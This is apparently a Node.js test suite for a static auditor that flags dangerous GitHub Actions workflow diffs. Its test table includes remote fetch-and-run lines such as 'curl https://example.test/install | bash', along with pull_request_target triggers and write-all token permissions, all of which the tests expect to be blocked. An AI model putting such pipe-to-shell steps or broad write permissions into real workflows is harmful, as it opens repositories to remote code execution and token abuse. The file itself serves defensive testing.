import test from 'node:test';
import assert from 'node:assert/strict';
import { runFailOnlyStaticDiffAudit } from '../candidate/fail-only-static-audit.mjs';

const workflow='.github/workflows/synthetic-test.yml';
const changes=[
  ['pull_request_target bare YAML key','pull_request_target:',true],
  ['pull_request_target inline YAML key','on: pull_request_target',true],
  ['pull_request_target bracket list','on: [push, pull_request_target]',true],
  ['all GitHub token write permissions','permissions: write-all',true],
  ['job-level GITHUB_TOKEN contents write','    contents: write',true],
  ['job-level GITHUB_TOKEN actions write','    actions: write',true],
  ['job-level GITHUB_TOKEN attestations write','    attestations: write',true],
  ['short-lived OIDC token write','    id-token: write',true],
  ['pull request review token write','    pull-requests: write',true],
  ['remote bash pipe','run: curl https://example.test/install | bash',true],
  ['remote wget pipe','run: wget https://example.test/install | sh',true],
  ['read-only token','    contents: read',false],
  ['plain PR trigger','on: pull_request',false],
  ['ordinary workflow step','run: echo HELLO_SYNTHETIC',false]
];
function fakeDiff(added,filename=workflow){
  return Buffer.from(
    'diff --git a/'+filename+' b/'+filename+'\n'+
    'index 0123456..6543210 100644\n'+
    '--- a/'+filename+'\n'+
    '+++ b/'+filename+'\n'+
    '@@ -1 +1 @@\n'+
    '-name: original\n'+
    '+'+added+'\n'
  );
}
function evaluate(line,path=workflow) {
  return runFailOnlyStaticDiffAudit({
    diffBytes:fakeDiff(line,path),
    runId:'synthetic-static-benchmark-001'
  });
}
for (const [label,line,blocker] of changes) {
  test('seeded workflow benchmark: '+label,()=>{
    const report=evaluate(line);
    assert.equal(report.approvalAuthorized,false);
    assert.equal(report.independenceVerified,false);
    const json=JSON.parse(report.reportBytes.toString('utf8'));
    assert.equal(report.provisionalState,blocker?'FAIL':'INCONCLUSIVE');
    assert.equal(report.blockingFindings>0,blocker);
    assert.equal(json.findings.length>0,blocker);
    assert.ok(!report.reportBytes.toString('utf8').includes('HELLO_SYNTHETIC'));
  });
}
test('static workflow rules do not claim a PASS for clean diffs',()=>{
  const report=evaluate('    contents: read');
  assert.equal(report.provisionalState,'INCONCLUSIVE');
  assert.equal(report.approvalAuthorized,false);
});
test('sensitive added lines are never reproduced in public report text',()=>{
  const secret='SYNTHETIC_PRIVATE_TOKEN_NOT_REAL_87655';
  const report=evaluate('run: curl https://example.test/install | bash #'+secret);
  assert.equal(report.provisionalState,'FAIL');
  assert.doesNotMatch(report.reportBytes.toString('utf8'),/SYNTHETIC_PRIVATE_TOKEN_NOT_REAL/);
});
test('similar text outside workflow files does not trigger GitHub workflow security rules',()=>{
  const result=evaluate('contents: write','docs/synthetic-note.md');
  assert.equal(result.provisionalState,'INCONCLUSIVE');
  assert.equal(result.blockingFindings,0);
});
